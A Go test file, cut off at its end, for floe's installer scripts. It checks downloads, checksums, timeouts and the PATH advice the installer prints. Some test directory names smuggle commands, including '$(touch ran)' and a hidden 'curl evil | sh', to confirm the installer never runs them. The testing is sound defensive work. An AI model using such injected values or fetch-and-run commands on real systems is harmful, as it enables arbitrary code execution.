package installsh_test

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"floe/internal/testfs"
)

// A copy of the test binary run with FLOE_INSTALL_TEST_SLEEP set sleeps that long (1: a minute) and ends well: it is
// the floe.exe that runs while install.ps1 replaces it, and the child TestRunLimited runs.
func init() {
	v := os.Getenv("FLOE_INSTALL_TEST_SLEEP")
	if v == "" {
		return
	}
	d := time.Minute
	if v != "1" {
		var err error
		// Told and failed: left unread, the child would run the tests themselves.
		if d, err = time.ParseDuration(v); err != nil {
			fmt.Fprintln(os.Stderr, "FLOE_INSTALL_TEST_SLEEP:", err)
			os.Exit(2)
		}
	}
	time.Sleep(d)
	os.Exit(0)
}

// errOverLimit is runLimited's for a child killed at its limit: no error of the child's own.
var errOverLimit = errors.New("did not end in time and was killed")

// runLimited runs the command build makes. When limit passes with the child still running, it calls atLimit and
// then kills the child: atLimit sees the child alive, and what waits on it as it waits.
// LIMIT: the limit is a guess (a child's time was not measured). When a child is killed with the servers' record
// running up to the limit, it was slow, not stuck: raise the limit.
// LIMIT: WaitDelay holds for a child that ended too: one that succeeded and left a child of its own holding its
// output longer than that fails with exec.ErrWaitDelay. Raise it if a shell comes to leave one.
func runLimited(parent context.Context, limit time.Duration, build func(context.Context) *exec.Cmd, atLimit func()) error {
	ctx, cancel := context.WithTimeout(parent, limit)
	defer cancel()
	cmd := build(ctx)
	over := false
	// os/exec calls it once, when ctx ends before it saw the child end, and Run returns after it has.
	cmd.Cancel = func() error {
		if !errors.Is(ctx.Err(), context.DeadlineExceeded) {
			return cmd.Process.Kill() // the test ended: as os/exec does
		}
		atLimit()
		err := cmd.Process.Kill()
		// LIMIT: on Unix, Kill tells a child that ended (os.ErrProcessDone) only once Wait has taken it: one that
		// ended by itself in that moment is told as killed. On Windows that Kill may fail instead (not tried), and
		// os/exec's own error of it is returned.
		over = err == nil
		return err
	}
	cmd.WaitDelay = 10 * time.Second
	err := cmd.Run()
	if over {
		return fmt.Errorf("%w (after %v)", errOverLimit, limit)
	}
	return err
}

// A child over its limit is killed and told as that, not as a child that failed, after atLimit saw it alive; one
// that ends in time is left alone.
func TestRunLimited(t *testing.T) {
	t.Parallel()

	self, err := os.Executable()
	if err != nil {
		t.Fatal(err)
	}
	// sleeper is the test binary sleeping so long; ended is closed once it is gone: its end of stdout is closed
	// then, and the read returns. Run closes the pipe under the reader, which os/exec warns of for the output that
	// would be lost: there is none here, and the read returns either way.
	sleeper := func(sleep string, ended chan<- struct{}) func(context.Context) *exec.Cmd {
		return func(ctx context.Context) *exec.Cmd {
			cmd := exec.CommandContext(ctx, self)
			cmd.Env = append(os.Environ(), "FLOE_INSTALL_TEST_SLEEP="+sleep)
			out, err := cmd.StdoutPipe()
			if err != nil {
				t.Error(err)
				return cmd
			}
			go func() {
				_, _ = out.Read(make([]byte, 1)) //nolint:errcheck // only that it returned
				close(ended)
			}()
			return cmd
		}
	}

	t.Run("over the limit", func(t *testing.T) {
		t.Parallel()
		ended := make(chan struct{})
		called, alive := false, false
		start := time.Now()
		// atLimit runs on a goroutine of os/exec's: it only notes what it saw, read after Run returned.
		err := runLimited(t.Context(), 2*time.Second, sleeper("2m", ended), func() {
			called = true
			select {
			case <-ended:
			case <-time.After(500 * time.Millisecond):
				alive = true
			}
		})
		var exit *exec.ExitError
		if !errors.Is(err, errOverLimit) || errors.As(err, &exit) {
			t.Errorf("runLimited = %v, want errOverLimit and no ExitError", err)
		}
		if !called || !alive {
			t.Errorf("atLimit called %v, the child alive in it %v, want both", called, alive)
		}
		if took := time.Since(start); took > 30*time.Second {
			t.Errorf("runLimited took %v", took)
		}
	})
	t.Run("ends in time", func(t *testing.T) {
		t.Parallel()
		called := false
		err := runLimited(t.Context(), 30*time.Second, sleeper("1s", make(chan struct{})), func() { called = true })
		if err != nil || called {
			t.Errorf("runLimited = %v, atLimit called %v, want neither", err, called)
		}
	})
}

// The fakes stand for the network and the machine: curl serves $FAKE_API for the API and
// $FAKE_ASSETS/<tag>/<name> for downloads, uname prints $FAKE_OS and $FAKE_ARCH. Neither reads
// stdin, which holds install.sh. curl takes no call without the limits on a silence, of $FAKE_TIMEOUT seconds (120
// when unset); a URL that holds $FAKE_STALL ends as a real curl does at those limits; each URL asked for is written
// to $FAKE_LOG.
const (
	fakeCurl = `#!/bin/sh
out= url= connect= limit= time=
while [ $# -gt 0 ]; do
  case "$1" in
    -o) out=$2; shift ;;
    --connect-timeout) connect=$2; shift ;;
    --speed-limit) limit=$2; shift ;;
    --speed-time) time=$2; shift ;;
    https://*) url=$1 ;;
  esac
  shift
done
[ -z "$FAKE_LOG" ] || echo "$url" >> "$FAKE_LOG"
want=${FAKE_TIMEOUT:-120}
if [ "$connect" != "$want" ] || [ "$limit" != 1 ] || [ "$time" != "$want" ]; then
  echo "fake curl: $url: --connect-timeout '$connect' --speed-limit '$limit' --speed-time '$time', want $want, 1 and $want" >&2
  exit 99
fi
if [ -n "$FAKE_STALL" ]; then
  case "$url" in *"$FAKE_STALL"*)
    echo "curl: (28) Operation too slow. Less than 1 bytes/sec transferred the last $want seconds" >&2
    exit 28 ;;
  esac
fi
case "$url" in
  https://api.github.com/repos/sukekyo26/floe/releases/latest)
    [ -f "$FAKE_API" ] || { echo 'curl: (22) The requested URL returned error: 404' >&2; exit 22; }
    if [ -n "$out" ]; then cat "$FAKE_API" > "$out"; else cat "$FAKE_API"; fi ;;
  https://github.com/sukekyo26/floe/releases/download/*)
    src=$FAKE_ASSETS/${url#https://github.com/sukekyo26/floe/releases/download/}
    [ -f "$src" ] || { echo 'curl: (22) The requested URL returned error: 404' >&2; exit 22; }
    cp "$src" "$out" ;;
  *) echo "fake curl: unexpected URL $url" >&2; exit 99 ;;
esac
`
	fakeUname = `#!/bin/sh
case "$1" in -s) echo "$FAKE_OS" ;; -m) echo "$FAKE_ARCH" ;; *) exit 1 ;; esac
`
)

// TestInstall runs install.sh as `curl … | sh` runs it, with curl and uname faked and only the tools it needs on PATH.
func TestInstall(t *testing.T) {
	t.Parallel()
	testfs.UnixOnly(t, "install.sh installs floe on Unix")

	script, err := os.ReadFile("../../install.sh")
	if err != nil {
		t.Fatal(err)
	}
	root := t.TempDir()
	// Written once before the parallel cases: a fork while another case writes an executable fails with
	// "text file busy" now and then.
	withSum := tools(t, filepath.Join(root, "with-sha256sum"), "sha256sum")
	withShasum := tools(t, filepath.Join(root, "with-shasum"), "shasum")
	assets := filepath.Join(root, "assets")
	bad := filepath.Join(root, "bad")
	release(t, assets, "")
	release(t, bad, "floe-linux-amd64")
	pretty := write(t, filepath.Join(root, "pretty.json"), "{\n  \"url\": \"x\",\n  \"tag_name\": \"v0.1.0\",\n  \"name\": \"v0.1.0\"\n}\n")
	compact := write(t, filepath.Join(root, "compact.json"), `{"url":"x","tag_name":"v0.1.0","assets":[{"name":"floe-linux-amd64"}]}`)
	notDir := write(t, filepath.Join(root, "file"), "")

	// What install.sh adds when curl gave up on a silence, and what it says of a FLOE_INSTALL_TIMEOUT it refuses.
	const waited, refused = "check your network and proxy and run it again; FLOE_INSTALL_TIMEOUT sets how many seconds to wait for an answer", "FLOE_INSTALL_TIMEOUT must be"
	type installCase struct {
		name, os, arch, api, assets, version, dir string
		shasum                                    bool   // only shasum on PATH, not sha256sum
		readOnly                                  bool   // the install directory is there but not writable
		timeout                                   string // FLOE_INSTALL_TIMEOUT
		stall                                     string // a URL that holds it never answers
		asks                                      int    // how many URLs curl is asked for; 0 is not looked at (a value refused is: none)
		want                                      string // the asset installed, or "" when it fails
		says, saysNot                             []string
	}
	fixed := []installCase{
		{name: "latest", os: "Linux", arch: "x86_64", api: pretty, want: "floe-linux-amd64"},
		{name: "latest one line", os: "Darwin", arch: "arm64", api: compact, want: "floe-darwin-arm64"},
		{name: "pinned", os: "Linux", arch: "aarch64", version: "0.1.0", want: "floe-linux-arm64"},
		{name: "pinned with v", os: "Linux", arch: "amd64", version: "v0.1.0", want: "floe-linux-amd64"},
		{name: "shasum", os: "Darwin", arch: "x86_64", version: "0.1.0", shasum: true, want: "floe-darwin-amd64"},
		{name: "checksum mismatch", os: "Linux", arch: "x86_64", version: "0.1.0", assets: bad, says: []string{"checksum mismatch"}},
		{name: "no release", os: "Linux", arch: "x86_64", says: []string{"FLOE_VERSION", "try again later"}},
		{name: "no such version", os: "Linux", arch: "x86_64", version: "0.9.9", says: []string{"download failed", "v0.9.9/floe-linux-amd64"}},
		{name: "arch", os: "Linux", arch: "armv7l", says: []string{"armv7l", "amd64 and arm64"}},
		{name: "os", os: "FreeBSD", arch: "amd64", says: []string{"freebsd", "linux and darwin", "install.ps1"}},
		{name: "dir not writable", os: "Linux", arch: "x86_64", version: "0.1.0", dir: filepath.Join(notDir, "bin"), says: []string{"FLOE_INSTALL_DIR"}},
		{name: "dir read-only", os: "Linux", arch: "x86_64", version: "0.1.0", readOnly: true, says: []string{"FLOE_INSTALL_DIR"}},
		{name: "a second to wait", os: "Linux", arch: "x86_64", api: pretty, timeout: "1", asks: 3, want: "floe-linux-amd64"},
		{name: "600 seconds to wait", os: "Linux", arch: "x86_64", api: pretty, timeout: "600", asks: 3, want: "floe-linux-amd64"},
		{name: "99999 seconds to wait", os: "Linux", arch: "x86_64", version: "0.1.0", timeout: "99999", asks: 2, want: "floe-linux-amd64"},
		{
			name: "the API never answers", os: "Linux", arch: "x86_64", api: pretty, stall: "/releases/latest", asks: 1,
			says:    []string{"download failed: https://api.github.com/repos/sukekyo26/floe/releases/latest", waited, "(now 120)"},
			saysNot: []string{"rate limit", "try again later"},
		},
		{
			name: "the binary never answers", os: "Linux", arch: "x86_64", version: "0.1.0", stall: "/floe-linux-amd64", asks: 1,
			says: []string{"download failed: https://github.com/sukekyo26/floe/releases/download/v0.1.0/floe-linux-amd64", waited, "(now 120)"},
		},
		{
			name: "SHA256SUMS never answers", os: "Linux", arch: "x86_64", version: "0.1.0", timeout: "7", stall: "/SHA256SUMS", asks: 2,
			says: []string{"download failed: https://github.com/sukekyo26/floe/releases/download/v0.1.0/SHA256SUMS", waited, "(now 7)"},
		},
		{name: "no such version waits for nothing", os: "Linux", arch: "x86_64", version: "0.9.9", asks: 1, says: []string{"download failed"}, saysNot: []string{waited}},
	}
	// Read as letters, not as a number: what sh and PowerShell would read apart is refused by both alike.
	unread := []string{"abc", "0", "08", "-5", "+5", "1.5", "1e3", "0x10", " 5", "100000", "5\n", "\uff15"}
	tests := make([]installCase, 0, len(fixed)+len(unread))
	tests = append(tests, fixed...)
	for _, v := range unread {
		tests = append(tests, installCase{
			name: fmt.Sprintf("refuses to wait %+q", v), os: "Linux", arch: "x86_64", api: pretty, timeout: v,
			says: []string{refused, "(got " + strings.TrimRight(v, "\n")},
		})
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			dir := tt.dir
			if dir == "" {
				dir = filepath.Join(t.TempDir(), "bin")
			}
			from := tt.assets
			if from == "" {
				from = assets
			}
			if tt.readOnly {
				if os.Geteuid() == 0 {
					t.Skip("root writes to a read-only directory")
				}
				if err := os.Mkdir(dir, 0o500); err != nil {
					t.Fatal(err)
				}
			}
			path := withSum
			if tt.shasum {
				if withShasum == "" {
					t.Skip("shasum is not on PATH")
				}
				path = withShasum
			}
			asked := filepath.Join(t.TempDir(), "asked")
			cmd := exec.CommandContext(t.Context(), "sh")
			cmd.Stdin = bytes.NewReader(script)
			cmd.Env = []string{
				"PATH=" + path, "HOME=" + t.TempDir(), "TMPDIR=" + t.TempDir(),
				"FLOE_INSTALL_DIR=" + dir, "FLOE_VERSION=" + tt.version, "FLOE_INSTALL_TIMEOUT=" + tt.timeout,
				"FAKE_OS=" + tt.os, "FAKE_ARCH=" + tt.arch, "FAKE_API=" + tt.api, "FAKE_ASSETS=" + from,
				"FAKE_STALL=" + tt.stall, "FAKE_LOG=" + asked,
			}
			// The fake curl wants what install.sh must pass: the seconds given, where it takes them.
			if slices.Contains(tt.says, refused) {
				tt.asks = 0
			} else if tt.timeout != "" {
				cmd.Env = append(cmd.Env, "FAKE_TIMEOUT="+tt.timeout)
			}
			var stderr bytes.Buffer
			cmd.Stderr = &stderr
			err := cmd.Run()
			for _, s := range tt.says {
				if !strings.Contains(stderr.String(), s) {
					t.Errorf("stderr does not say %q:\n%s", s, stderr.String())
				}
			}
			for _, s := range tt.saysNot {
				if strings.Contains(stderr.String(), s) {
					t.Errorf("stderr says %q:\n%s", s, stderr.String())
				}
			}
			if tt.stall != "" && strings.Count(stderr.String(), "failed") != 1 {
				t.Errorf("install.sh told the failure other than once:\n%s", stderr.String())
			}
			if log, _ := os.ReadFile(asked); (tt.asks > 0 || slices.Contains(tt.says, refused)) && strings.Count(string(log), "\n") != tt.asks { //nolint:errcheck // no file is no URL
				t.Errorf("curl was asked for %d URLs, want %d:\n%s", strings.Count(string(log), "\n"), tt.asks, log)
			}
			if tt.want == "" {
				if err == nil {
					t.Fatalf("install.sh succeeded, want it to fail:\n%s", stderr.String())
				}
				if _, statErr := os.Stat(filepath.Join(dir, "floe")); statErr == nil {
					t.Error("floe is installed although install.sh failed")
				}
				return
			}
			if err != nil {
				t.Fatalf("install.sh: %v\n%s", err, stderr.String())
			}
			installed := filepath.Join(dir, "floe")
			got, err := os.ReadFile(installed)
			if err != nil {
				t.Fatal(err)
			}
			if want := asset(tt.want); string(got) != want {
				t.Errorf("installed %q, want %q", got, want)
			}
			if fi, err := os.Stat(installed); err != nil || fi.Mode().Perm()&0o111 == 0 {
				t.Errorf("installed floe is not executable: %v %v", fi.Mode(), err)
			}
		})
	}
}

// TestPathNote is what install.sh says of a directory that is not on PATH. The command it shows is run in the shell it
// is shown for, and the file it wrote is read by that shell: bash for ~/.bashrc; zsh for ~/.zshrc where zsh is on
// PATH, sh where it is not (CI has no zsh; the line is POSIX). The line alone, shown to other sh-like shells, is read
// by sh.
// LIMIT: the line shown to fish is compared letter by letter, never run: CI has no fish. It was run once by hand, in
// fish 4.2.1, for the directories below.
func TestPathNote(t *testing.T) {
	t.Parallel()
	testfs.UnixOnly(t, "install.sh installs floe on Unix")

	script, err := os.ReadFile("../../install.sh")
	if err != nil {
		t.Fatal(err)
	}
	root := t.TempDir()
	path := tools(t, filepath.Join(root, "tools"), "sha256sum")
	noSed := tools(t, filepath.Join(root, "no-sed"), "sha256sum")
	if err = os.Remove(filepath.Join(noSed, "sed")); err != nil {
		t.Fatal(err)
	}
	assets := filepath.Join(root, "assets")
	release(t, assets, "")
	zsh, err := exec.LookPath("zsh")
	if err != nil {
		zsh = ""
	}

	// What install.sh says: a command to paste, the line alone, that the directory cannot be on PATH, or words alone.
	type says struct{ command, line, cannot, words bool }
	var (
		run    = says{command: true}
		fish   = says{command: true}
		line   = says{line: true}
		cannot = says{cannot: true}
		words  = says{words: true}
		none   = says{}
	)
	tests := []struct {
		name, os, shell string
		dir             string // under the case's own directory when relative to it: H is its home, W where it runs
		noHome, noShell bool
		onPath          string // added to PATH, H and W read as in dir
		cdpath          bool   // CDPATH names a directory that holds a bin too
		noSed           bool   // no sed on PATH
		before          string // what the startup file holds already
		want            says
		fish            bool   // the command is fish's
		file            string // the startup file a command writes, under the home
		inHome          bool   // the line names the directory by $HOME
	}{
		{name: "zsh, the default directory", os: "Linux", shell: "/bin/zsh", dir: "H/.local/bin", want: run, file: ".zshrc", inHome: true},
		{name: "zsh on macOS", os: "Darwin", shell: "/usr/bin/zsh", dir: "H/.local/bin", want: run, file: ".zshrc", inHome: true},
		{name: "bash on Linux", os: "Linux", shell: "/usr/bin/bash", dir: "H/.local/bin", want: run, file: ".bashrc", inHome: true},
		{name: "no line break at the file's end", os: "Linux", shell: "/bin/zsh", dir: "H/bin", before: "alias x=y", want: run, file: ".zshrc", inHome: true},
		{name: "outside the home", os: "Linux", shell: "/bin/bash", dir: "W/opt/bin", want: run, file: ".bashrc"},
		{name: "the home's neighbour", os: "Linux", shell: "/bin/bash", dir: "H2/bin", want: run, file: ".bashrc"},
		{name: "the home itself", os: "Linux", shell: "/bin/bash", dir: "H", want: run, file: ".bashrc"},
		{name: "a space", os: "Linux", shell: "/bin/zsh", dir: "W/my tools/bin", want: run, file: ".zshrc"},
		{name: "a quote", os: "Linux", shell: "/bin/zsh", dir: "W/o'brien", want: run, file: ".zshrc"},
		{name: "two quotes", os: "Linux", shell: "/bin/bash", dir: "W/''two", want: run, file: ".bashrc"},
		{name: "a double quote", os: "Linux", shell: "/bin/bash", dir: `W/a"b`, want: run, file: ".bashrc"},
		{name: "a dollar", os: "Linux", shell: "/bin/zsh", dir: "W/$HOME", want: run, file: ".zshrc"},
		{name: "a dollar in the home", os: "Linux", shell: "/bin/zsh", dir: "H/a$b", want: run, file: ".zshrc", inHome: true},
		{name: "a backslash before a dollar", os: "Linux", shell: "/bin/bash", dir: `W/a\$b`, want: run, file: ".bashrc"},
		{name: "two backslashes", os: "Linux", shell: "/bin/zsh", dir: `W/a\\b`, want: run, file: ".zshrc"},
		{name: "backslashes", os: "Linux", shell: "/bin/bash", dir: `W/back\slash\n`, want: run, file: ".bashrc"},
		{name: "a command in backquotes", os: "Linux", shell: "/bin/zsh", dir: "W/a`touch ran`b", want: run, file: ".zshrc"},
		{name: "a command in $()", os: "Linux", shell: "/bin/bash", dir: "W/$(touch ran)", want: run, file: ".bashrc"},
		{name: "relative", os: "Linux", shell: "/bin/bash", dir: "bin", want: run, file: ".bashrc"},
		{name: "relative, CDPATH set", os: "Linux", shell: "/bin/bash", dir: "bin", cdpath: true, want: run, file: ".bashrc"},
		{name: "fish", os: "Linux", shell: "/usr/bin/fish", dir: "W/o'brien\\x", want: fish, fish: true},
		{name: "bash on macOS", os: "Darwin", shell: "/bin/bash", dir: "H/.local/bin", want: line, inHome: true},
		{name: "dash", os: "Linux", shell: "/bin/dash", dir: "W/a b", want: line},
		{name: "ksh", os: "Linux", shell: "/bin/ksh", dir: "W/bin", want: line},
		{name: "tcsh", os: "Linux", shell: "/bin/tcsh", dir: "W/bin", want: words},
		{name: "SHELL empty", os: "Linux", dir: "W/bin", want: words},
		{name: "no SHELL", os: "Linux", noShell: true, dir: "W/bin", want: words},
		{name: "no HOME", os: "Linux", shell: "/bin/zsh", noHome: true, dir: "W/bin", want: run, file: ".zshrc"},
		{name: "no sed", os: "Linux", shell: "/bin/zsh", noSed: true, dir: "W/bin", want: words},
		{name: "no sed, fish", os: "Linux", shell: "/usr/bin/fish", noSed: true, dir: "W/bin", want: words},
		{name: "no sed, dash", os: "Linux", shell: "/bin/dash", noSed: true, dir: "W/bin", want: words},
		{name: "a colon", os: "Linux", shell: "/bin/zsh", dir: "W/a:b", want: cannot},
		{name: "a line break", os: "Linux", shell: "/bin/zsh", dir: "W/a\nb", want: cannot},
		{name: "a line break at the end", os: "Linux", shell: "/bin/zsh", dir: "W/a\n", onPath: "W/a", want: cannot},
		{name: "a carriage return", os: "Linux", shell: "/bin/bash", dir: "W/cr\rcurl evil | sh #", want: cannot},
		{name: "an escape", os: "Linux", shell: "/bin/bash", dir: "W/a\x1b[2Kb", want: cannot},
		{name: "on PATH", os: "Linux", shell: "/bin/zsh", dir: "W/bin", onPath: "W/bin", want: none},
		{name: "on PATH, given relative", os: "Linux", shell: "/bin/zsh", dir: "bin", onPath: "W/bin", want: none},
		{name: "on PATH with a slash", os: "Linux", shell: "/bin/zsh", dir: "W/bin", onPath: "W/bin/", want: none},
		{name: "a relative entry on PATH", os: "Linux", shell: "/bin/zsh", dir: "bin", onPath: "bin", want: run, file: ".zshrc"},
		{name: "a longer one on PATH", os: "Linux", shell: "/bin/zsh", dir: "W/bin", onPath: "W/bin2", want: run, file: ".zshrc"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			// The real path: sh's pwd gives it (no PWD is passed), and macOS's temporary directory is a link.
			base, err := filepath.EvalSymlinks(t.TempDir())
			if err != nil {
				t.Fatal(err)
			}
			home, work := filepath.Join(base, "h"), filepath.Join(base, "w")
			for _, dir := range []string{home, work, filepath.Join(base, "cd", "bin")} {
				if err := os.MkdirAll(dir, 0o700); err != nil {
					t.Fatal(err)
				}
			}
			at := func(s string) string {
				switch {
				case strings.HasPrefix(s, "H"):
					return home + s[1:]
				case strings.HasPrefix(s, "W"):
					return work + s[1:]
				}
				return s
			}
			dir := at(tt.dir)
			abs := dir
			if !filepath.IsAbs(dir) {
				abs = filepath.Join(work, dir)
			}

			// The environment is given whole, here and below: a ZDOTDIR of whoever runs the test would send the line
			// shown to zsh into their own ~/.zshrc.
			cmd := exec.CommandContext(t.Context(), "sh")
			cmd.Stdin = bytes.NewReader(script)
			cmd.Dir = work
			cmd.Env = []string{
				"TMPDIR=" + t.TempDir(), "FLOE_INSTALL_DIR=" + dir, "FLOE_VERSION=0.1.0",
				"FAKE_OS=" + tt.os, "FAKE_ARCH=x86_64", "FAKE_ASSETS=" + assets,
			}
			tools := path
			if tt.noSed {
				tools = noSed
			}
			if tt.onPath == "" {
				cmd.Env = append(cmd.Env, "PATH="+tools)
			} else {
				cmd.Env = append(cmd.Env, "PATH="+tools+":"+at(tt.onPath))
			}
			if !tt.noHome {
				cmd.Env = append(cmd.Env, "HOME="+home)
			}
			if !tt.noShell {
				cmd.Env = append(cmd.Env, "SHELL="+tt.shell)
			}
			if tt.cdpath {
				cmd.Env = append(cmd.Env, "CDPATH="+filepath.Join(base, "cd"))
			}
			var stderr bytes.Buffer
			cmd.Stderr = &stderr
			if err := cmd.Run(); err != nil {
				t.Fatalf("install.sh: %v\n%s", err, stderr.String())
			}
			said := stderr.String()
			if !strings.Contains(said, "for your agent") {
				t.Errorf("install.sh stopped before its last line:\n%s", said)
			}
			// What path_note says starts on the line after "installed"; that line itself is install.sh's own.
			_, note, _ := strings.Cut(said, " installed floe ")
			if _, note, _ = strings.Cut(note, "\n"); strings.ContainsAny(note, "\r\x1b") {
				t.Errorf("install.sh prints a control character of the name in what it says of PATH:\n%q", said)
			}
			shown := after(said, "To add it, run:\n")
			put := after(said, "put this line in your shell's startup file:\n")
			got := says{
				command: shown != "",
				line:    put != "",
				cannot:  strings.Contains(said, "cannot be a PATH entry"),
				words:   strings.Contains(said, "add it to the PATH your shell starts with"),
			}
			if got != tt.want {
				t.Fatalf("install.sh says %+v, want %+v:\n%s", got, tt.want, said)
			}
			if again := strings.Contains(said, "then open a new terminal"); again != (tt.want == line || tt.want == run && !tt.fish) {
				t.Errorf("install.sh says to open a new terminal: %v:\n%s", again, said)
			}
			if tt.want != none && tt.want != cannot && !strings.Contains(said, abs+" is not on your PATH") {
				t.Errorf("install.sh does not name %q as not on PATH:\n%s", abs, said)
			}

			// sh reads what the other sh-like shells are shown; bash and zsh read their own files.
			reader := []string{"sh"}
			switch {
			case tt.fish:
				quoted := strings.NewReplacer(`\`, `\\`, `'`, `\'`).Replace(abs)
				if want := "fish_add_path '" + quoted + "'"; shown != want {
					t.Errorf("shown %q, want %q", shown, want)
				}
			case tt.want == line:
				if strings.Contains(said, ">>") {
					t.Errorf("install.sh names a file to a shell whose file it cannot know:\n%s", said)
				}
				rc := filepath.Join(base, "rc")
				write(t, rc, put+"\n")
				first(t, reader, rc, home, abs, tt.inHome)
			case tt.want == run:
				if tt.file == ".bashrc" {
					reader = []string{"bash", "--norc", "--noprofile"}
				} else if zsh != "" {
					reader = []string{zsh, "-f"}
				}
				rc := filepath.Join(home, tt.file)
				if tt.before != "" {
					write(t, rc, tt.before)
				}
				if !strings.HasSuffix(shown, " >> "+map[string]string{".zshrc": `"${ZDOTDIR:-$HOME}/.zshrc"`, ".bashrc": "~/.bashrc"}[tt.file]) {
					t.Errorf("the command writes another file than %s: %s", tt.file, shown)
				}
				paste := exec.CommandContext(t.Context(), reader[0], slices.Concat(reader[1:], []string{"-c", shown})...) //nolint:gosec // G204: the command install.sh shows, which is what is tested
				paste.Dir = work
				paste.Env = []string{"PATH=" + os.Getenv("PATH"), "HOME=" + home}
				for _, kv := range append(paste.Env, cmd.Env...) {
					if strings.HasPrefix(kv, "ZDOTDIR=") || strings.HasPrefix(kv, "XDG_CONFIG_HOME=") || strings.HasPrefix(kv, "ENV=") || strings.HasPrefix(kv, "BASH_ENV=") {
						t.Fatalf("%s is passed on: a file under it, not under the case's home, would be written", kv)
					}
				}
				if out, err := paste.CombinedOutput(); err != nil {
					t.Fatalf("the command shown fails in %s: %v\n%s\n%s", reader[0], err, shown, out)
				}
				got, err := os.ReadFile(rc)
				if err != nil {
					t.Fatal(err)
				}
				if tt.before != "" && !strings.HasPrefix(string(got), tt.before+"\n") {
					t.Errorf("the file's own last line changed: %q", got)
				}
				first(t, reader, rc, home, abs, tt.inHome)
				if _, err := os.Stat(filepath.Join(work, "ran")); err == nil {
					t.Error("a command in the directory's name ran")
				}
			}
		})
	}
}

// after is the line of said that follows the one ending in mark, without the two spaces it is set in by; "" when
// said has no such line.
func after(said, mark string) string {
	_, rest, ok := strings.Cut(said, mark)
	if !ok {
		return ""
	}
	next, _, _ := strings.Cut(rest, "\n")
	return strings.TrimPrefix(next, "  ")
}

// first reads the startup file rc in the shell reader and fails t unless PATH then starts with dir. With inHome the
// file names dir by $HOME, so that another home gives another directory.
func first(t *testing.T, reader []string, rc, home, dir string, inHome bool) {
	t.Helper()

	read := func(home string) string {
		args := slices.Concat(reader[1:], []string{"-c", `. "$1" && printf %s "$PATH"`, "sh", rc})
		cmd := exec.CommandContext(t.Context(), reader[0], args...) //nolint:gosec // G204: the shells of the test
		cmd.Env = []string{"PATH=/rest", "HOME=" + home}
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("reading %s in %s: %v\n%s", rc, reader[0], err, out)
		}
		return string(out)
	}
	if got, want := read(home), dir+":/rest"; got != want {
		t.Errorf("PATH is %q after %s reads the file, want %q", got, reader[0], want)
	}
	other := read("/another")
	if moved := strings.HasPrefix(other, "/another/"); moved != inHome {
		t.Errorf("with another home PATH is %q; the file names the directory by $HOME: want %v", other, inHome)
	}
}

// TestInstallPS1Text is install.ps1's bytes: `irm | iex` stops at a BOM, and Windows PowerShell reads a script with no
// BOM in the system's code page, so ASCII alone.
func TestInstallPS1Text(t *testing.T) {
	t.Parallel()

	b, err := os.ReadFile("../../install.ps1")
	if err != nil {
		t.Fatal(err)
	}
	for i, c := range b {
		if c > 0x7e || (c < 0x20 && c != '\n') {
			t.Fatalf("install.ps1 has byte %#x at %d: write it in ASCII, with LF and no BOM", c, i)
		}
	}
}

// TestInstallPS1OffWindows is install.ps1 run by PowerShell on Linux or macOS: it stops before it asks for anything.
func TestInstallPS1OffWindows(t *testing.T) {
	t.Parallel()
	testfs.UnixOnly(t, "install.ps1 refuses a system other than Windows")

	pwsh, err := exec.LookPath("pwsh")
	if err != nil {
		if os.Getenv("GITHUB_ACTIONS") != "" {
			t.Fatal("pwsh is not on PATH; CI's ubuntu has it")
		}
		t.Skip("pwsh is not on PATH")
	}
	script, err := filepath.Abs("../../install.ps1")
	if err != nil {
		t.Fatal(err)
	}
	//nolint:gosec // G204: pwsh and the repository's install.ps1
	cmd := exec.CommandContext(t.Context(), pwsh, "-NoProfile", "-NonInteractive", "-Command",
		"Get-Content -Raw -LiteralPath '"+strings.ReplaceAll(script, "'", "''")+"' | Invoke-Expression")
	cmd.Env = []string{"PATH=" + os.Getenv("PATH"), "HOME=" + t.TempDir()}
	out, err := cmd.CombinedOutput()
	if err == nil {
		t.Fatalf("install.ps1 succeeded off Windows:\n%s", out)
	}
	if !strings.Contains(string(out), "floe-install: install.ps1 installs floe on Windows") || !strings.Contains(string(out), "install.sh") {
		t.Errorf("install.ps1 does not send to install.sh:\n%s", out)
	}
}

// tools makes a directory of the fakes and links to the tools install.sh and the fakes run, with sum as the one
// SHA-256 tool, so that the script sees only that one. It returns "" when sum is shasum and the host has none; any
// other tool missing fails, so that the test does not skip itself away on a machine that lost one.
func tools(t *testing.T, dir, sum string) string {
	t.Helper()

	if err := os.Mkdir(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	for name, text := range map[string]string{"curl": fakeCurl, "uname": fakeUname} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(text), 0o700); err != nil { //nolint:gosec // G306: a program to run
			t.Fatal(err)
		}
	}
	for _, name := range []string{"mktemp", "tr", "sed", "head", "grep", "awk", "mkdir", "mv", "chmod", "rm", "cat", "cp", sum} {
		at, err := exec.LookPath(name)
		if err != nil {
			if name == "shasum" {
				return ""
			}
			t.Fatalf("%s is not on PATH: %v", name, err)
		}
		testfs.Symlink(t, at, filepath.Join(dir, name))
	}
	return dir
}

// release writes the assets of v0.1.0 under dir/v0.1.0 and their SHA256SUMS; the sum of broken, if named, is wrong.
func release(t *testing.T, dir, broken string) {
	t.Helper()

	tag := filepath.Join(dir, "v0.1.0")
	if err := os.MkdirAll(tag, 0o700); err != nil {
		t.Fatal(err)
	}
	var sums strings.Builder
	for _, target := range []string{"linux-amd64", "linux-arm64", "darwin-amd64", "darwin-arm64"} {
		name := "floe-" + target
		body := asset(name)
		write(t, filepath.Join(tag, name), body)
		if name == broken {
			body += "x"
		}
		sum := sha256.Sum256([]byte(body))
		// Lines of other names holding this one come first, so that a loose match picks a wrong sum.
		other := hex.EncodeToString(make([]byte, sha256.Size))
		sums.WriteString(other + "  " + name + ".sig\n" + other + "  x" + name + "\n")
		sums.WriteString(hex.EncodeToString(sum[:]) + "  " + name + "\n")
	}
	write(t, filepath.Join(tag, "SHA256SUMS"), sums.String())
}

func asset(name string) string { return "binary " + name + "\n" }

func write(t *testing.T, name, text string) string {
	t.Helper()

	if err := os.WriteFile(name, []byte(text), 0o600); err != nil { //nolint:gosec // G703: a path under the test's temporary folder
